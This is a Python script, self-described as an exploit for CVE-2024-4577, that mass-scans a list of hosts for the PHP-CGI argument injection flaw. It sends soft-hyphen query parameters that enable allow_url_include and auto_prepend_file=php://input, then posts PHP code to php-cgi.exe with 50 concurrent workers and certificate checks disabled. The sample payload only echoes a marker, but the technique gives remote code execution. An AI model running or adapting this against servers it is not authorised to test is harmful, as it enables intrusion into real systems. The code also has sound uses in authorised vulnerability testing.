#!/usr/bin/env python3

import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode, urljoin
from colorama import init, Fore, Style
import urllib3

# Initialize colorama
init()

# Suppress only the single warning for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    banner = f"""
    {Fore.BLUE}{Style.BRIGHT}
    #################################################
    #                CVE-2024-4577                  #
    #    Exploit provided by Professor the Hunter   #
    #################################################
    {Style.RESET_ALL}
    """
    print(banner)

def check_vulnerability(hosts, output_file=None, max_workers=50):
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    data = "<?php echo 'bughuntingtesting'; ?>"
    content_length = str(len(data))

    query_params = {
        "%ADd allow_url_include": "1",
        "%ADd auto_prepend_file": "php://input"
    }

    vulnerable_hosts = []
    not_vulnerable_count = 0
    error_count = 0
    request_count = 0

    def check_host(host):
        nonlocal not_vulnerable_count, error_count, request_count
        nonlocal vulnerable_hosts

        base_url = urljoin(host, "/php-cgi/php-cgi.exe")
        url = f"{base_url}?{urlencode(query_params, doseq=True)}"
        headers = {
            "Host": host.replace("http://", "").replace("https://", ""),
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Content-Length": content_length,
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive"
        }

        try:
            # Disable SSL verification explicitly
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
            request_count += 1

            if "bughuntingtesting" in response.text:
                vulnerable_hosts.append(host)
                return f"Vulnerable: {host}"
            else:
                not_vulnerable_count += 1
                return f"Not Vulnerable: {host}"
        except requests.exceptions.RequestException as e:
            error_count += 1
            return f"Error connecting to {host}: {e}"

    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_host, host) for host in hosts]
        for future in as_completed(futures):
            results.append(future.result())

    # Prepare results for printing
    for result in results:
        if "Vulnerable" in result:
            print(f"{Fore.RED}{result}{Style.RESET_ALL}")
        elif "Not Vulnerable" in result:
            print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}{result}{Style.RESET_ALL}")

    # Prepare summary
    summary_lines = [
        f"Requests sent: {request_count}",
        f"Vulnerable hosts: {len(vulnerable_hosts)}",
        f"Not vulnerable hosts: {not_vulnerable_count}",
        f"Errors encountered: {error_count}"
    ]

    # Print summary
    for line in summary_lines:
        print(line)

    # Save summary to file if output_file is provided
    if output_file:
        with open(output_file, 'w') as file:
            file.write("\n".join(summary_lines))

if __name__ == "__main__":
    print_banner()
    
    parser = argparse.ArgumentParser(description='Check for vulnerable servers.')
    parser.add_argument('-l', '--list', required=True, help='Path to the file containing the list of hosts')
    parser.add_argument('-o', '--output', help='Output file to save results')
    parser.add_argument('-w', '--workers', type=int, default=50, help='Number of concurrent workers')
    args = parser.parse_args()

    with open(args.list, 'r') as file:
        hosts = [line.strip() for line in file if line.strip()]

    check_vulnerability(hosts, args.output, args.workers)
